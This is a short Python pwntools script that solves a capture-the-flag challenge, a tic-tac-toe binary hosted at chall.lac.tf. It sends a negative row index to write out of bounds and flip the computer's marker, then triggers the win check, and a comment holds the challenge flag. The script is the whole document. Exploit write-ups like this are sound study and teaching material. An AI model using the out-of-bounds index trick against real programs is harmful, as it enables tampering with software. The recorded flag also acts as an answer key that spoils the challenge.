#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 30001)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

# Trick the COMPUTER to thinking its X
r.sendlineafter(b"Enter row #(1-3):", b"-7")
r.sendlineafter(b"Enter column #(1-3):", b"2")

# Make a normal move to trigger checkWin()
r.sendlineafter(b"Enter row #(1-3):", b"1")
r.sendlineafter(b"Enter column #(1-3):", b"1")

# Should print the flag
# lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
r.interactive()
